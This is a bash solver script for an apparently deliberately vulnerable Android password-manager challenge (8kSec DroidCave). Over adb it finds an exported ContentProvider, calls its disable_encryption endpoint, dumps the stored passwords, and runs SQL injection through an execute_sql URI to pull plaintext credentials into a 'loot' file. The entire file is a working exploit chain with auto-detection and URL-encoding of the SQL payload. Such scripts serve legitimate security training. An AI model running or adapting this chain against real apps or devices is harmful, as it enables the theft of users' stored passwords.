#!/usr/bin/env bash
# ============================================================================
#  droidcave_payload.sh — 8kSec DroidCave "Secure Password Management" solver
# ----------------------------------------------------------------------------
#  Abuse chain (exposed ContentProvider, no permission gate):
#    1) content://<auth>/disable_encryption   -> decrypts every stored row
#    2) content://<auth>/passwords            -> dump rows (plaintext now)
#    3) content://<auth>/execute_sql/<SQL>    -> SQLi dump (CAST blob -> text)
#       + optional sqlite_master table listing
#    4) content://<auth>/enable_encryption    -> restore original state
#
#  Auto-detects package / authority / android-user, and URL-encodes the SQL
#  so the adb remote shell never sees spaces, parentheses or quotes.
#
#  Usage:
#    ./droidcave_payload.sh
#    ./droidcave_payload.sh -s emulator-5554
#    ./droidcave_payload.sh -a com.eightksec.droidcave.provider -u 10
#    ./droidcave_payload.sh --no-restore      # leave DB decrypted
#    ./droidcave_payload.sh --no-sqli         # only /passwords dump
#    ./droidcave_payload.sh --list-tables     # extra sqlite_master dump
# ============================================================================
set -u

SERIAL=""; PKG=""; AUTH=""; AUSER=""
NO_RESTORE=0; NO_SQLI=0; LIST_TABLES=0

usage() {
  cat <<'EOF'
Usage: droidcave_payload.sh [options]
  -s SERIAL     adb device serial (adb -s)
  -p PKG        target package      (default: auto-detect / com.eightksec.droidcave)
  -a AUTH       provider authority  (default: auto-detect / com.eightksec.droidcave.provider)
  -u USER       android user id     (default: auto-detect)
  --no-restore  skip enable_encryption at the end (leave DB decrypted)
  --no-sqli     skip the execute_sql dump (use only /passwords)
  --list-tables also dump sqlite_master table names via SQLi
  -h, --help    show this help
EOF
}

while [ $# -gt 0 ]; do
  case "$1" in
    -s) SERIAL="$2"; shift 2;;
    -p) PKG="$2"; shift 2;;
    -a) AUTH="$2"; shift 2;;
    -u) AUSER="$2"; shift 2;;
    --no-restore) NO_RESTORE=1; shift;;
    --no-sqli) NO_SQLI=1; shift;;
    --list-tables) LIST_TABLES=1; shift;;
    -h|--help) usage; exit 0;;
    *) echo "[x] unknown option: $1"; usage; exit 1;;
  esac
done

ADB=(adb)
[ -n "$SERIAL" ] && ADB=(adb -s "$SERIAL")
dsh() { "${ADB[@]}" shell "$@"; }

log()  { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
err()  { printf '\033[1;31m[x]\033[0m %s\n' "$*"; }

# percent-encode a SQL string so the adb remote shell never chokes on
# spaces/parens/quotes (Android Uri decodes them back before the provider
# reads the last path segment)
urlenc() {
  local s="$1" out="" c i hex
  for ((i=0; i<${#s}; i++)); do
    c="${s:i:1}"
    case "$c" in
      [-a-zA-Z0-9.~]) out+="$c";;
      ' ') out+="%20";;
      '(') out+="%28";;
      ')') out+="%29";;
      "'") out+="%27";;
      '=') out+="%3D";;
      *)   printf -v hex '%%%02X' "'$c"; out+="$hex";;
    esac
  done
  printf '%s' "$out"
}

command -v adb >/dev/null 2>&1 || { err "adb not found in PATH"; exit 1; }
log "checking adb device..."
"${ADB[@]}" get-state >/dev/null 2>&1 || { err "no device/emulator online"; exit 1; }

# --- 1) package ------------------------------------------------------------
if [ -z "$PKG" ]; then
  PKG="$(dsh pm list packages | tr -d '\r' | grep -ioE 'package:[a-z0-9._]*droidcave[a-z0-9._]*' | head -n1 | cut -d: -f2)"
  PKG="${PKG:-com.eightksec.droidcave}"
fi
log "target package : $PKG"

# --- 2) android user -------------------------------------------------------
if [ -z "$AUSER" ]; then
  AUSER=0
  for u in 0 10 11 999; do
    if dsh "pm list packages --user $u" 2>/dev/null | tr -d '\r' | grep -q "$PKG"; then
      AUSER="$u"; break
    fi
  done
fi
log "android user   : $AUSER"
USER_ARG=""
[ "$AUSER" != "0" ] && USER_ARG="--user $AUSER"

# --- 3) authority ----------------------------------------------------------
if [ -z "$AUTH" ]; then
  AUTH="$(dsh "dumpsys package providers $USER_ARG" | tr -d '\r' | grep -ioE '[a-z0-9._]*droidcave[a-z0-9._]*provider[a-z0-9._]*' | head -n1)"
  AUTH="${AUTH:-com.eightksec.droidcave.provider}"
fi
log "authority      : $AUTH"

BASE="content://$AUTH"
LOOT="droidcave_loot_$(date +%Y%m%d_%H%M%S).txt"

{
  echo "DroidCave loot — $(date '+%F %T')"
  echo "adb     : ${SERIAL:-default device}"
  echo "package : $PKG"
  echo "auth    : $AUTH"
  echo "user    : $AUSER"
} > "$LOOT"

query() { dsh "content query $USER_ARG --uri $BASE/$1" 2>&1 | tr -d '\r'; }
run_step() {
  {
    echo; echo "=============================================================="
    echo "== $1"; echo "=============================================================="
  } >> "$LOOT"
  query "$2" | tee -a "$LOOT"
}

# --- 0) reachability probe -------------------------------------------------
log "probing provider ($BASE/passwords)..."
probe="$(query passwords)"
if printf '%s\n' "$probe" | grep -qiE 'could not find provider|securityexception|illegalargumentexception|permission denial'; then
  err "provider unreachable. raw output:"
  printf '    %s\n' "$probe"
  warn "verify: adb shell pm list packages | grep droidcave"
  warn "        adb shell dumpsys package providers | grep -i droidcave"
  exit 1
fi
log "provider reachable."

# --- the chain -------------------------------------------------------------
log "STEP 1/4  disable_encryption (decrypt every stored row)"
run_step "STEP 1 — disable_encryption (decrypt DB)" "disable_encryption"

log "STEP 2/4  dumping /passwords (plaintext now)"
run_step "STEP 2 — /passwords dump" "passwords"

if [ "$NO_SQLI" -eq 0 ]; then
  SQL="SELECT id,name,username,CAST(password AS TEXT) AS pass FROM passwords"
  log "STEP 3/4  execute_sql SQLi dump"
  run_step "STEP 3 — execute_sql SQLi: $SQL" "execute_sql/$(urlenc "$SQL")"

  if [ "$LIST_TABLES" -eq 1 ]; then
    TSQL="SELECT name FROM sqlite_master WHERE type='table'"
    run_step "STEP 3b — sqlite_master tables" "execute_sql/$(urlenc "$TSQL")"
  fi
fi

if [ "$NO_RESTORE" -eq 0 ]; then
  log "STEP 4/4  enable_encryption (restore original state)"
  run_step "STEP 4 — enable_encryption (restore)" "enable_encryption"
else
  warn "--no-restore: database left DECRYPTED"
fi

log "done. loot saved to: $LOOT"
